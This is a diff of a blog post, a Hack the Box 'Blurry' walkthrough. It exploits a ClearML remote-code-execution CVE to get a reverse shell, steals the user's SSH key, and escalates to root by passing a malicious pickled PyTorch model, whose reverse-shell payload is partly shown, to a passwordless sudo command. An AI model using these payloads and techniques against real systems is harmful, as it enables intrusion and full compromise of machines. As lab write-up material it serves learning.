@@ -1,17 +1,23 @@
 ---
-draft: true
-title: 
-date: 2024-08-13
+draft: false
+title: "Hack the Box #5 - Blurry w/o Metasploit"
+date: 2024-08-14
 author: William
-category: 
-tags: 
+category:
+  - Tech
+tags:
+  - Hacking
+  - Security
 cover:
-  image: test
-  alt: test
+  image: hack_the_box_5_blurry.png
+  alt: hack_the_box_5_blurry.png
 ---
 
-Lets give this bad boy a go on a lovely Saturday afternoon
+I woke up this morning breathed in that sweet morning air. I could feel it, to days the day ima hack a box and come to the sun setting I had pwned this box by getting an AI model to execute a reverse shell that got me root! Here we go
 
+![ChewingStraw](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExamtrYXIyajJ5NjFtNzRzc25mdmQzbTFsNG9xamtqbHJpZXZudXhydyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/lqqB7E9CdSG76/200.gif#center)
+
+## Enumeration
 What can nmap tell us about this target
 
 ```bash
@@ -57,28 +63,15 @@ chat                    [Status: 200, Size: 218733, Words: 12692, Lines: 449, Du
 ```
 
 
-So we have app , files , chat subdomains. Adding these to the hosts file lets enumerate each of these for their sub directories
+So we have `app` , `files` and `chat` as subdomains. Adding these to the hosts file lets enumerate each of these for their sub directories.
 
+I went ahead and dug around with both gobuster and manually exploring. When going to `app.blurry.htb` we get taken to an webapp and are prompted to create an account. Which I do, called `Deez` and poke around.
 
-
-The `app` subdomain is running a app called clear..ml and with some trusty googling we find this vuln [https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit](https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit)
-
-[https://github.com/diegogarciayala/CVE-2024-24590-ClearML-RCE-CMD-POC/tree/main](https://github.com/diegogarciayala/CVE-2024-24590-ClearML-RCE-CMD-POC/tree/main)
-
-
-
+## Exploitation
+In the investigation we find the `app` subdomain is running an app called **clear.ml** and with some trusty googling we find this vuln [https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit](https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit) to execute this script first we need to create credentials on our clear.ml account. 
 ![keys](https://i.imgur.com/457thdA.png#center)
 
-
-
-
-In configuring thios we get failed to reolve `api` add hto hosts Add all subdomains to hosts file
-
-
-
-
-
-
+Once that is done and the subdomain `api` is added to the hosts file we configure the exploit.
 ```bash
 └──$ python3 exploit.py                                                    
                                            
@@ -113,9 +106,9 @@ ClearML setup completed successfully.
 
 ```
 
-The script politoly offers to execute the exploit but fails due to it needing pwncat
+Now we are primed for attack and it is time to pounce 
 
-self report i know but after installing it
+![pounce](https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExb3JleDdvcjRmcXIweGN0bXkzajQwZ3BzaW1ja2x4MWV0MGQ3eWUwaiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/26h0qOq4LxV8YcDKw/giphy.gif#center)
 
 
 ```bash
@@ -143,46 +136,35 @@ jippity@blurry:~$
 
 ```
 
-
-followed up with a
-
+And after a little wait for the ML model to execute we get a lovely call home, which leads us nicely to the first user flag and poking around the user profile we find a SSH key which helps us keep persistence on our target.
 ```bash
 jippity@blurry:~$ cat user.txt
 ================ USER_FLAG ================
-```
-
-
-Now to get some persistence and escalate to root
-
-```bash
 jippity@blurry:~$ cat /.ssh/id_rsa
-=========== PRIVATE_KEY ===========
+=============== PRIVATE_KEY ===============
 _________________________________________
 └─$ ssh -i id_rsa jippity@10.10.11.19
-
 jippity@blurry:~$ 
-
 ```
 
-Persistance achived. Now lets transfure over linpeas and see how we can esculate
+## Privilege Escalation
+
+With persistence achieved it is time to escalate to root. Transferring over linpeas using our newly acquired private key we can get a broadview of what vectors to escalation we have available to us. 
 
 ```bash
 └─$ scp -i /home/kali/.ssh/id_rsa ./linpeas.sh jippity@10.10.11.19:~/
-```
-
-Looking through linpeas findings one thing of interest is the program /usr/bin/evaluate_model which is run as root with no password. Upon evaluating the script it take a .pth file. A .pth file is a compiled model file so if we can create our own malicious model then we can escalate.
-
-```bash
+_______________________________________________________________________
 jippity@blurry:~$ linpeas.sh
 ...
 User jippity may run the following commands on blurry:
     (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
 ...
-
 ```
 
-We can use this script that a summoned from the depths of the internet. As an aside Pytouch is a big library
+Looking through linpeas findings one thing stands out as interesting. There is a program `/usr/bin/evaluate_model` that when executed will be run as root and it doesn't require a password to do so. Taking a closer look at the script in question it looks to only take .pth files.
+A .pth file is a compiled AI model file that is used by [PyTorch to save and load models](https://pytorch.org/tutorials/beginner/saving_loading_models.html). So in theory if we can create our own malicious model we can get this script to execute the malicious model and use it to escalate.
 
+Here is the script ill be using:
 ```python
 import torch
 import torch.nn as nn
@@ -216,22 +198,21 @@ torch.save(malicious_model, 'callhome.pth')
 - **`__reduce__ Method`**: Overridden to include a command that creates a reverse shell using netcat.
 - **`torch.save` Function**: Saves the model to a file named `.callhome.pth`.
 
-Pushing this onto the box and we execute as follows
-
+Pushing this onto the box and we pass the malicious model to the `evaluate_model` script as follows and wait...
 ```bash
-
 jippity@blurry:~$ sudo /usr/bin/evaluate_model /models/callhome.pth 
+```
 
-# ==================
-Looking to our nc awaiting in the wings we get a call home with a root reverse shell
-
+Looking to our netcat awaiting in the wings with baited breath... SHELL!!!
+```Bash
 # whoami
 root
 # cat /root/root.txt
 ================= ROOT_FLAG =================
-
 ```
 
-We arent challenged for a password due to the config of sudo doesnt require a password for that spesific program call. So the fact that we dont know any user passwords doesnt matter
+And that is root baby! WINNING!!! And I get my [rubber stamp of approval](https://www.hackthebox.com/achievement/machine/1695260/605) from Hack the Box as a reward.  Now that I can say with confidence I have hacked an AI model I'm going to go touch some grass :D
 
-[https://www.hackthebox.com/achievement/machine/1695260/605](https://www.hackthebox.com/achievement/machine/1695260/605)
+![touchGrass](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExdWt0Z3Z5a2R6ODhpM2h1azVqNTExazE1MHVqMms5amZzbGwzdzBsbCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VlYBM5zERKWD5ONSzi/giphy.gif#center)
+
+
